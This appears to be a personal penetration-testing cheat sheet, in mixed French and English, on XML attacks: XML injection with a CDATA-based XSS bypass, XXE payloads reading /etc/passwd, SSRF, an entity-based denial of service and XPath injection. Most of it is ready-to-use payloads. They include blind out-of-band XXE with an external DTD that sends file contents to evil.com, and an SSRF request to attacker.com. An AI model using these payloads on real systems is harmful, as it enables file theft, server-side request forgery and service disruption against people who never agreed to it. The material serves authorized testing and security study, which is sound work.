# XXE and other XML vulnerabilities

## XML injection

Si nos inputs sont directement ajoutés en tant que nœud dans un doc xml, on peut :

* Inject malformed string to break the parser
* Modify information with well crafted payload
* If the xml is converted to html, `<![CDATA[]]>` might just be stripped, making it possible to inject other script undetected

```markup
<html>
    <![CDATA[<]]>script<![CDATA[>]]>alert(‘xss’)<![CDATA[<]]>/
    script<![CDATA[>]]>
</html>

<!-- to : -->
<script>alert(‘XSS’)</script>
```

## XXE - _XML External Entities_

### Inband

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE inband [
    <!ELEMENT inband ANY>
    <!ENTITY xxe SYSTEM "/etc/passwd">
]>
<inband>&xxe;</inband>
```

### SSRF - _Server Side Request Forgery_

```markup
<?xml version="1.0"?>
<!DOCTYPE ssrf [
    <!ENTITY request SYSTEM "http://attacker.com">
]>
<ssrf>&request;</ssrf>
```

### Out-of-band \(blind\)

```markup
<!-- test.xml-->
<?xml version="1.0" encoding="UTF-8 ?>
<!DOCTYPE test SYSTEM "http://evil.com/external.dtd">
<test>&send;</test>

<!-- external.dtd -->
<!ENTITY % file_content SYSTEM "/etc/passwd">
<!ENTITY % wrapper "<!ENTITY send 'http://evil.com/?%file_content;'>">
%wrapper;
```

Au cas où le contenu du fichier ferait bugger le parser, on peut abuser de _CDTATA_ :

```markup
<!-- test.xml-->
<?xml version="1.0" encoding="UTF-8 ?>
<!DOCTYPE test SYSTEM "http://evil.com/external.dtd">
<test>&send;</test>

<!-- external.dtd -->
<!ENTITY % file_content SYSTEM "/etc/passwd">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % wrapper "<!ENTITY send 'http://evil.com/?%start;%file_content;%end;'>">
%wrapper;
```

### DDOS

```markup
<?xml version=”1.0” encoding=”ISO-8859-1”?>
 <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM “file:///dev/random” >
]>
<foo>&xxe;</foo>
```

### Ressources supplémentaires

* [https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/](https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/) 
* [https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
* See also "A Billion Laugh" attack

## XPath Injection

Elles suivent la même logique que les injections SQL \(`‘or ‘1’ = ‘1`\)

```text
# this :
string(//user[user/text()=’gandalf’ and pass/text()=’qwertasd123’]/account/text())

# to this :
string(//user[user/text()=’gandalf’ and pass/text()=’’ or ‘1’ = ‘1’]/account/text())
```

J'imagine que le même genre de chose est possible avec XQuery.

## Sources

* [Owasp testing guide v4](https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf)
* PwnFunction [video](https://youtu.be/gjm6VHZa_8s)
* Misc research

